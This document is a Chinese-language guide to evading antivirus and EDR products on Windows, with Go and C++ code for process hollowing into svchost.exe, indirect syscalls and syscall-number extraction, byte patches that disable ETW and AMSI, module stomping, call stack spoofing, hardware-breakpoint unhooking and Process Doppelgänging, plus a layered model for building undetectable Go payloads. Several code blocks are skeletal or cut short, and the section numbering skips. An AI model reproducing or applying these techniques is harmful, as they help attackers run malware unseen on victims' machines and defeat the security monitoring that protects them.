## 一、Process Hollowing（进程镂空）⭐⭐⭐⭐⭐

### 原理
1. 创建挂起的合法进程
2. 镂空目标进程的原始PE内存
3. 写入恶意代码到合法进程空间
4. 修改PEB中的入口点
5. 恢复线程——恶意代码在合法进程壳中运行

### 完整Go实现
```go
package main

import (
    "syscall"
    "unsafe"
    "golang.org/x/sys/windows"
)

func main() {
    // 1. CreateProcess - svchost.exe, suspended
    si := &windows.StartupInfo{}
    pi := &windows.ProcessInformation{}
    syscall.CreateProcess(
        windows.StringToUTF16Ptr("C:\\Windows\\System32\\svchost.exe"),
        nil, nil, nil, false,
        0x00000004, // CREATE_SUSPENDED
        nil, nil, si, pi,
    )
    
    // 2. Get thread context
    ctx := &windows.Context{ContextFlags: windows.CONTEXT_FULL}
    windows.GetThreadContext(pi.Thread, ctx)
    
    // 3. Read PEB ImageBase via NtReadVirtualMemory
    // Rdx = PEB address in x64 calling convention
    
    // 4. NtUnmapViewOfSection via indirect syscall
    
    // 5. NtAllocateVirtualMemory via indirect syscall
    
    // 6. Write PE headers + sections via NtWriteVirtualMemory
    
    // 7. Update PEB ImageBase
    
    // 8. Set RCX to entry point, SetThreadContext
    
    // 9. NtResumeThread
}
```

## 二、间接系统调用（Indirect Syscall）⭐⭐⭐⭐⭐

### Direct vs Indirect
```
Direct:   user_code → syscall → kernel
          调用栈中有用户代码地址 → EDR检测

Indirect: user_code → ntdll_gadget(syscall;ret) → kernel
          调用栈中出现ntdll地址 → 合法外观
```

### Syscall Gadget 搜索（Go）
```go
func FindSyscallGadget(ntdllBase uintptr) uintptr {
    // 搜索 byte pattern: 0F 05 (syscall)  C3 (ret)
    dosHeader := (*windows.ImageDosHeader)(unsafe.Pointer(ntdllBase))
    ntHeader := (*windows.ImageNtHeaders)(unsafe.Pointer(ntdllBase + uintptr(dosHeader.E_lfanew)))
    textSection := findSection(ntdllBase, ntHeader, ".text")
    
    for i := uintptr(0); i < textSection.Size-1; i++ {
        addr := ntdllBase + textSection.VirtualAddress + i
        if *(*uint16)(unsafe.Pointer(addr)) == 0x050F { // syscall
            if *(*byte)(unsafe.Pointer(addr + 2)) == 0xC3 { // ret
                return addr
            }
        }
    }
    return 0
}
```

### SSN提取（Halo's Gate/Hell's Gate）
```go
// Halo's Gate: 从syscall stub指令中提取SSN
// mov r10, rcx
// mov eax, [SSN]    ← 从这提取
// syscall
func ExtractSSN(funcAddr uintptr) uint16 {
    for i := 0; i < 32; i++ {
        b := *(*byte)(unsafe.Pointer(funcAddr + uintptr(i)))
        // 查找 opcode B8 (mov eax, imm32) = 0xB8
        if b == 0xB8 {
            return *(*uint16)(unsafe.Pointer(funcAddr + uintptr(i) + 1))
        }
    }
    return 0
}
```

## 三、ETW & AMSI Patching

### ETW Patch（阻止事件追踪）
```go
// EtwEventWrite 返回0 (STATUS_SUCCESS)
func PatchETW() {
    ntdll := windows.NewLazyDLL("ntdll.dll")
    etw := ntdll.NewProc("EtwEventWrite")
    // 写入 0xC3 (ret) 到函数开头
    // 或者写入: xor eax, eax; ret (0x31, 0xC0, 0xC3)
    patch := []byte{0x31, 0xC0, 0xC3}
    writeMemory(etw.Addr(), patch)
}
```

### AMSI Patch
```go
// 方法1: AmsiScanBuffer → ret
// 方法2: AmsiInitialize → 设置amsiContext为NULL触发异常
// 方法3: AmsiOpenSession → ret

func PatchAMSI() {
    amsi := windows.NewLazyDLL("amsi.dll")
    amsiScan := amsi.NewProc("AmsiScanBuffer")
    // mov eax, AMSI_RESULT_CLEAN (0x80070057)
    // ret
    patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
    writeMemory(amsiScan.Addr(), patch)
}
```

## 六、模块践踏（Module Stomping）⭐⭐⭐

```go
// 1. 加载合法DLL（如: kernel32.dll或winhttp.dll）
hLib := LoadLibrary("winhttp.dll")

// 2. 获取DLL基址和大小
dllBase := getModuleBase("winhttp.dll")
dllSize := getModuleSize("winhttp.dll")

// 5. 恢复内存保护为RX
```

## 七、Go全链路免杀体系

### 7层过滤穿透模型
```
Layer 1 编译期     → garble混淆 + ldflags strip
Layer 2 加载期     → PE头混淆 + 节表变形 + 熵值控制
Layer 3 内存分配   → unsafe.Slice + VirtualAlloc无痕映射
Layer 4 API调用    → LazyDLL + proc.Call手动间接syscall
Layer 5 网络通信   → HTTP/2伪装 + SNI/ALPN动态变异
Layer 6 行为签名   → runtime.GC()随机强制GC扰乱熵值
Layer 7 沙箱逃逸   → 多维环境指纹检测（时间/CPU/内存/进程树）
```

```bash
  -ldflags="-s -w -H=windowsgui" \
  -gcflags="-N -l" \
```

## 八、内存扫描对抗

### NtCreateThreadEx扫描对抗（NullGate技术）
```go
// Defender在NtCreateThreadEx后会立即扫描附近30KB
// NullGate技巧：
// 1. 分配PAGE_NOACCESS空间

```

```
    INT3 [指令已屏蔽]
```

## 十一、调用栈欺骗（Call Stack Spoofing）⭐⭐⭐⭐⭐

> 详见 `14-调用栈欺骗与高级注入.md`

### SilentMoonwalk核心原理

EDR通过栈展开检测调用者。SilentMoonwalk用ROP链（Desync模式）构造假栈帧，使调用栈看起来来自合法DLL。

```cpp
// Desync模式原理
// 原始: malware.exe → ntdll!gadget → syscall → kernel
// 欺骗: malware.exe → [假帧:kernel32.dll] → [假帧:kernelbase.dll] → ntdll!gadget → kernel
```

### 快速集成
```cpp
#include "SilentMoonwalk.h"
SMW::Initialize();
SMW::SpoofedCall("NtAllocateVirtualMemory", ...);
// 所有syscall自动获得栈欺骗
```

## 十三、硬件断点Unhooking（HWBP + VEH）

> 详见 `14-调用栈欺骗与高级注入.md`

### 原理
使用 DR0-DR3 调试寄存器在敏感API入口设置硬件断点 → 触发INT1异常 → VEH处理程序接管 → 在异常处理中修改执行流/返回假结果

**三大优势**: 
1. 零内存修改 → 绕过完整性检查
2. 无需修改页面保护 → 绕过页面保护检测
3. 极少EDR监控DR寄存器 → 长期有效性

### 典型应用
- HWBP on `AmsiScanBuffer` → 返回 `AMSI_RESULT_CLEAN`
- HWBP on `EtwEventWrite` → 返回 `STATUS_SUCCESS`
- HWBP syscall → 手动syscall绕过Hook

## 十四、Process Doppelgänging / Herpaderping / Ghosting

| 技术 | 原理 | 文件落地 | 检测难度 |
|------|------|---------|---------|
| **Doppelgänging** | NTFS事务 + Rollback → 文件从不存在 | ❌ 否 | ⭐⭐⭐⭐⭐ |
| **Herpaderping** | 写入后修改 → 磁盘和执行内容不同 | ✅ 是 | ⭐⭐⭐⭐ |
| **Ghosting** | DELETE PENDING + Section映射 → 删除后运行 | ❌ 否 | ⭐⭐⭐⭐ |
| **Hollowing** | 镂空合法进程镜像 | ✅ 是(合法) | ⭐⭐⭐⭐ |

### Process Doppelgänging 流程
```cpp
// 1. NTFS事务中创建文件
CreateTransaction → CreateFileTransacted → WriteFile
// 2. 从事务文件创建Section
NtCreateSection(hTransaction)
// 3. 回滚事务（文件消失）
RollbackTransaction(hTransaction)
// 4. 从Section创建进程 — 文件从未在磁盘存在过
NtCreateProcessEx(hSection)
```
